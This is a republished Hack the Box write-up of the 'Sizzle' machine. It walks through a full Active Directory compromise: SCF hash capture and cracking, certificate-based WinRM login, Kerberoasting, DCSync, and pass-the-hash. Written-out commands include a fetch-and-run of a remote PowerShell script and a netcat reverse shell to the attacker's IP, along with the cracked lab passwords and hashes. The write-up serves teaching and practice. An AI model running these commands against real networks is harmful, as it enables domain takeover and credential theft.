# :game_die: Medium

> **Original Source:** [Medium](https://infosecwriteups.com/hack-the-box-sizzle-write-up-62f3464701be)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Hack the Box — Sizzle Write-up


*[https://www.hackthebox.eu/home/machines/profile/169](https://www.hackthebox.eu/home/machines/profile/169)*


Sizzle is an Insane-difficulty machine from [Hack the Box](https://www.hackthebox.eu/) created by [mrb3n](https://www.hackthebox.eu/home/users/profile/2984) and [lkys37en](https://www.hackthebox.eu/home/users/profile/709), of which are the authors of 2 out of 3 Hack the Box Pro Labs that are currently available.


Sizzle is a fairly old machine as it was released January of 2019. I decided to work on this box as I recently completed Hack the Box’s Offshore(Pro Lab by mrb3n) almost a month ago and I wanted to check how comfortable I would be solving this. I won’t be explaining concepts/techniques that may have been explained in my [Forest writeup](https://link.medium.com/kn9nOEK587). You can refer to that writeup for details.


To summarize the steps taken to solve the box:

### Initial foothold:


- Identify writable share filled with red-herring

- Drop .scf file to gather NetNTLMv2 hash then crack it

- Authenticate to AD CS certsrv and sign a CSR as amanda

- Login via HTTPS PS Remoting

### Amanda → Mrlky


### Mrlky → Administrator


Basically solving the box felt very short if you have encountered/performed these techniques.

### Tools used:


### Scanning:


I first run `masscan` to quickly identify open ports:


```
masscan -p1-65535,U:1-65535 10.10.10.103 --rate=1000 -e tun0
```


Based on the open ports such as 53,389,636, I can safely assume that this box is a Windows Server functioning as a Domain Controller. I then proceed on running a default `nmap` scan:


```
sudo nmap -sV -sC -oA nmap/initial 10.10.10.103 -vv -n
```


I then check on the interesting results.

### FTP — Port 21


From the nmap result, it seems that the `nmap` script *ftp-anon* identified that anonymous FTP login are allowed.


I connect to the ftp service and checked for any files, but found nothing interesting.


```
ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:sif0): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```


>

I think on the RFC for ftp, it is ideal to use your email to track anonymous logins, but is not a requirement. But basically any password will work.


Nothing interesting on FTP.

### HTTP — Port 80


Checking port 80, interesting HTTP methods are supported but these usually leads to information disclosure or authentication bypass. But since its IIS 10, I did not check on that anymore.


Checking the page, I am presented with a GIF of a bacon being sizzled?


I then ran a directory brute force using dirsearch:


```
dirsearch.py -u [https://10.10.10.103/](https://10.10.10.103/) -e aspx,txt
```


Interesting directories are /certsrv and /certenroll. The /certsrv is more interesting as the status code is 401(which means we are Unauthorized, indicating there must be an HTTP auth, usually). I move on to enumerate Windows ports.

### RPC, Netbios, Ldap — Port 135,139, 389


These usually allow NULL sessions(no user and password required) which eventually leads to enumeration of the objects(users, computers, etc.) in the domain.


It is worth noting though that port 389 presents me with a certificate.


```
ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-14T05:50:14
| Not valid after: 2021-07-14T05:50:14
| MD5: bd32 c0f4 6546 7f24 8e28 e47d 55e4 c192
| SHA-1: 17ea 3a28 8d36 9a5a 7498 3393 d5ac 8013 9d76 70af
```


So the DNS domain name most likely is HTB.LOCAL. I then tried commands on `ldapsearch` and used `ldapdomaindump` but no new information was given.

### HTTPS — Port 443


Checking on the results of 443, I found nothing of interest.


### SMB — Port 445


I then started my enumeration for SMB. I first use`smbclient` to list shares through a NULL session:


```
smbclient -L 10.10.10.103
```


Interesting shares are *CertEnroll, Department Shares, and Operations*. The shares ADMIN$, C$, NETLOGIN, and SYSVOL are builtin shares on Windows so having them in the results is common. I then used `smbmap` to check what rights does an unauthenticated user has:


```
/opt/smbmap/smbmap.py -H 10.10.10.103 -u '' -p ''
```


Sadly, I don’t get anything. I then moved on to `Crackmapexec(cme)` to list shares.


```
/opt/cme smb 10.10.10.103 --sharesSMB 10.10.10.103 445 SIZZLE [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
```


I get an error. It seems that I can’t list shares using `smbmap` and `cme`, so I decided to manually do it using `smbclient`. Checking out the *Operations* share using `smbclient`, I tried to list what’s inside using the `dir` command but get access denied:


I then connect to the *Department Shares* share and list what’s inside:


Interesting. A lot of directories. I can list directories recursively by using `recurse`during the `smbclient` prompt. The list of possible users are the following:


Directories under HR:


Directories under Tax:


Direcotries under \ZZ_ARCHIVE:


It seems that there are many files under the *\ZZ_ARCHIVE* directory. What’s notable is that the file sizes and time of creation are identical. I then downloaded random files on my local machine to check their contents.


I then run `md5sum` against the files and found that they have similar hashes.


I then decided to download all the files on the share(not opsec friendly!) to identify if there might be a single file that is different.


The `-D` flag sets the current working directory under the share. The `-c` flag are `smbclient` commands which will be executed on the directory you set using the `-D` flag.


```
smbclient -D "\ZZ_ARCHIVE" -c "dir;prompt;mget *" "\\\\10.10.10.103\\Department Shares"
```


I also then monitor the directory and compute their md5:


```
watch -n 1 "echo;md5sum *"
```


After downloading all the files, all of the hashes are the same. This is a dead end I think. I then proceeded to go back the interesting directories found on HTTP.


## Get sif0’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Searching for `/certsrv` would lead you to various articles. One good [article](https://www.sonicwall.com/support/knowledge-base/how-can-i-obtain-a-certificate-from-a-windows-certificate-authority-ca/170503319041199/) I found is this, aside from the [Microsoft](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)) documentation. Checking on the `/certsrv `directory:


I get an HTTP authentication prompt. I then tried usual default combinations such as `admin:admin` and `admin:password` and intercepted it using Burp.


What’s interesting is the Authorization is NTLM. I also thought that the working credentials here are most likely the same login for a domain user. I then went back the *Users* directory under the *Department Shares* share and noticed that there is a Public directory which has a different date on when the last time a file was written there. I then tried to upload a dummy file called `test.txt`, and the upload is successful:


I then created a Bash one-liner that will upload the `test.txt` file on each directory and list its contents.


```
for user in $(cat users.txt); do smbclient -D "\Users" -N -c "prompt; cd $user; put test.txt; dir" "\\\\10.10.10.103\\Department Shares"; done
```


No other directory I can upload to aside the Public directory.

### SCF to get NetNTLMv2:


Knowing that I can upload files to a share and this is a recurring situation in HTB, I then tried to upload an `SCF`(Shell Command File) which includes a path to my IP. Once a user clicks on the `SCF` file, the SIZZLE machine will authenticated to my share as the user who “clicked” on the SCF file. I won’t dive in the technicalities s but the `challenge-respons`e scenario includes a nonce which is encrypted by the user’s password. We can then capture this and crack the hash to gain the user’s password. The contents of the SCF file:


```
[Shell]
Command=2
Iconfile=\\10.10.14.3\sifo\doesntmatter
[Taskbar]
Command=ToggleDesktop
```


I then run `responder`, a tool which will listen for connections and capture authentication requests. I set it to listen on the tun0 interface:


```
responder -I tun0
```


I then put the file called `@sifo.scf` on the share.

>

I appended “@” as this will put the file on top of the listing of Windows/File Explorer when opened.


After a while, I get a connection from `HTB\amanda.` I can then put the hash on a file and crack it using `hashcat` using rockyou as the wordlist. Most of the time hashes found in Hack the Box machines are “crackable” using rockyou. The `-m 5600` flag corresponds to NetNTLMv2.


```
hashcat -m 5600 amanda.netntlmv2 /usr/share/wordlists/rockyou.txt --force
```


The password of `HTB\Amanda` is `Ashare1972`. I then enumerate more. I started with the domain’s password policy, so I can be aware of potential lockouts.


```
cme smb 10.10.10.103 -d HTB -u amanda -p Ashare1972 --pass-pol
```


So there is a lockout of 30 minutes, and minimum password length is 7. I then proceed to list the shares as `amanda`, hoping there might be read/write access on the shares.


```
cme smb 10.10.10.103 -d HTB -u amanda -p Ashare1972 --shares
```


Nothing interesting. Next thing I did is to enumerate the domain using `ldapdomaindump`:


```
ldapdomaindump 10.10.10.103 -u HTB\\amanda -p Ashare1972 -o ldapdomaindump/ --no-json --no-grep
```


So domain users are `sizzler`, `mrlky`, and `amanda`. It is notable that `mrlky` and `amanda` belong to the `Remote Management Users` group, which means they can perform `PS Remoting`, which runs on port 5985(HTTP) or 5986(HTTPS). I then tried logging in via `evil-winrm` but it errors out.


```
evil-winrm -u amanda -i 10.10.10.103 -p Ashare1972
```


Having no other lead, I then decided to go back to `/certsrv` and use `amanda’s` credentials. I was able to login. I then realized that I have to work on something here to login using SSL on `evil-winrm`(port 5986). I checked on the flags of `evil-winrm `and found a few flags that I might need:


So most likely I’ll be needing a public key and private key of some sort. I won’t be explaining the concepts involved here as they are confusing and I might not be able to explain it well to you. I suggest you read it on your own.


Since I am logged in as the domain user `amanda`, I then tried to request a user certificate. The steps are Request a certificate -> User Certificate -> Key Strength.


I can now see that a certificate is installed on my browser.


I can then do a backup of this file, which would lead to a [.p12](https://en.wikipedia.org/wiki/PKCS_12)file. I named it `amanda` .


I can then extract the private key file from the .p12 file:


```
openssl pkcs12 -in amanda -nocerts -out amanda.key
```


I can then create a CSR(certificate signing request) and submit its contents on the AD CS:


```
openssl req -newkey rsa:2048 -keyout amanda.key -nodes -out amanda.csr
```


I can download the DER encoded certificate and feed it into `evil-winrm`:


```
evil-winrm -c certnew.cer -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972 -S
```


I am able to login as `amanda`:


### Amanda → Mrlky


I then recursively lists files under the `C:\Users` directory:


```
gci -path c:\users\ -recurse -depth 3
```


I then used one of built-in features of `evil-winrm `which is to bypass-[AMSI,](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) but is prevented as it seems `PowerShell` is in [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/).


I then tried to load the `PowerShell` version of `SharpHound` which is an Ingestor for `Bloodhound`(note that this is bad opsec as I already have a hint the CLM is enabled).


```
iex(new-object net.webclient).downloadString('[http://10.10.14.3/s.ps1'](http://10.10.14.3/s.ps1')); invoke-bloodhound -collectionmethod All --LdapUsername Amanda --Domain HTB --LdapPassword Ashare1972 --EncryptZip --ZipFilename sif0
```


I get permission denied. I then decided to check if I really am in CLM, which indeed I am:


I tried the common bypass which is to downgrade to `PowerShell` version 2, but this doesn’t work on `evil-winrm`, at least based from my experience.


I then decided to put files on one directory which usually bypasses `[Applocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)`(basically another prevention unauthorized binaries and applications).


```
c:\windows\system32\spool\drivers\color\
```


I then put `SharpHound.ps1`(naming it s.ps1) on the box using PowerShell’s `Invoke-WebRequest` . I tried to import `SharpHound` but still wasn’t able to. I kept on running `SharpHound` to show you the limitations if CLM is enabled. I then put `SharpHound.exe`(naming it s.exe) on the box. I was able to run it.


I then tried to copy the `Bloodhound` zip file via SMB:


On my `impacket` smbserver, I get repetitive incoming and closed down connections, which I think is an issue if the client can’t authenticate because they are not allowed to connect to an SMBv1 share.


I then decided to just mount my share as drive `x:` , specifying a username and password to authenticate:


```
net use x: \\10.10.14.3\sifo /user:sifo sifopassword
```


I re-ran my smbserver:


```
sudo /opt/impacket/examples/smbserver.py sifo . -smb2support -username sifo -password sifopassword
```


I was able to copy the file. I also calculated the MD5 hash of the file for integrity checking.


Now that I have the file on my local machine, I initiate `neo4j` as preparation to launching the `Bloodhound` GUI.


```
/usr/bin/neo4j console
```


I then launch `Bloodhound`:


I then checked `mrlky’s` details:


It is notable that he has an SPN set. Also, `mrlky` has the two `GetChanges(DCSync)` rights on the domain `HTB.LOCAL` , which I can use later when I am gain access to the `mrlky`user.


### Kerberoasting:


`Kerberoasting` is an attack that allows you to recover an account’s password that has an `SPN` associated to them. I need to request a service ticket`(TGS)` for that `SPN` of the target account. The encryption type of the `TGS` is `RC4_HMAC_MD5` which means that the `TGS` is encrypted using the target account’s NTLM hash. If the account’s password is weak enough, I can crack it and gain the plaintext password.


Knowing that an `SPN` is set for the user `mrlky`, I can try Kerberoasting that account. I will be using Rubeus, a tool that is very useful in active directory assessments. I then download a copy on the machine, and ran it to check if its OK.


I first compute the RC4 of the plaintext password `Ashare1972` as this is required in requesting a TGT:


```
.\r.exe hash /password:Ashare1972
```


I then request a ticket as `amanda`, and saving the file to `amanda-tgt` ,


```
.\r.exe asktgt /user:amanda /rc4:7D0516EA4B6ED084F3FDF71C47D9BEB3 /outfile:amanda-tgt
```


Now I have a TGT, I can then request a service ticket for the service `http/sizzle`, which will be encrypted using the NTLM hash of `mrlky`.


```
.\r.exe asktgs /service:http/sizzle /ticket:amanda-tgt
```


Seeing that everything looks fine, I can now use the kerberoast module from Rubeus to request a again a `TGS`:


```
.\r.exe kerberoast /spn:http/sizzle /ticket:amanda-tgt /nowrap
```


Checking hashcat’s example hashes, `mode 13100` is required to crack `TGS-REP etype 23`(which I think is `RC4-HMAC`).


```
hashcat -m 13100 spn-hash /usr/share/wordlists/rockyou.txt --force
```


Hashcat was able to crack it. The password of mrlky is `Football#7` .


Note that the user mrlky has `GetChanges` rights on the domain `HTB.LOCAL` . From BloodHound’s Help:

>

The user MRLKY@HTB.LOCAL has the DS-Replication-Get-Changes privilege on the domain HTB.LOCAL. Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack.


Before I can think of abusing DCsync, I need to be in the context of `mrlky.` I can repeat the steps performed earlier to gain a `.cer` file and a `.key` file to connect to `PS Remoting`. Generating a` .key` file from the .p12 file:


```
openssl pkcs12 -in mrlky.p12 -nocerts -out mrlky.key
```


Generating a CSR:


```
openssl req -newkey rsa:2048 -keyout mrlky.key -nodes -out mrlky.csr
```


I can now login as `mrlky` on SIZZLE:


```
evil-winrm -u mrlky -i 10.10.10.103 -S -c mrlky.cer -k mrlky.key -p Football#7
```


Checking the files under th `C:\Users` directory:


```
gci -path c:\users\ -recurse -depth 3
```


I now have access to `user.txt:`


### DCSync:


Knowing that there are a few security controls running on the machine, rather than putting Mimikatz on the box, I decided to just use `secretsdump.py` from impacket:


```
/opt/impacket/examples/secretsdump.py htb/mrlky@10.10.10.103
```


I now have hashes for all the users. I then tried using `psexec.py` from impacket to execute commands as `Administrator`:


```
/opt/impacket/examples/psexec.py htb/administrator@10.10.10.103 whoami -hashes :f6b7160bfc91823792e0ac3a162c9267
```


Unfortunately, it just hung. I then used `cme` to run the command `hostname` using the `-x` flag:


```
sudo /opt/cme smb 10.10.10.103 -d HTB -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -x hostname
```


I get a response of `sizzle` which means everything looks good. I then tried to execute a command via PowerShell using the `-X` flag:


```
sudo /opt/cme smb 10.10.10.103 -d HTB -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -X gci
```


I get what is expected. I can now simply upload a `netcat` executable and use it to get a reverse shell. I download a file a `netcat` executable on the SIZZLE machine:


```
iwr -uri [http://10.10.14.3/nc.exe](http://10.10.14.3/nc.exe) -outfile nc.exe
```


I setup my listener on my Kali:


```
rlwrap nc -nlvp 9001
```


>

Note: I use rlwrap so I can use arrow keys when I get a shell.


I then execute a command that will initiate the connection to my listener using cme:


```
sudo /opt/cme smb 10.10.10.103 -d HTB -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -X "c:\windows\system32\spool\drivers\color\nc.exe 10.10.14.3 9001 -e cmd.exe"
```


On my listener, I get a connection. I verify that I am running as `Administrator` on the host SIZZLE.


I can now list files under `Administrator\Desktop`, and find root.txt there:


And that’s how I solved Sizzle from HacktheBox! It was an awesome journey but definitely worth it! Thanks for reading! 🍺

---

*Originally published on [Medium](https://infosecwriteups.com/hack-the-box-sizzle-write-up-62f3464701be). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
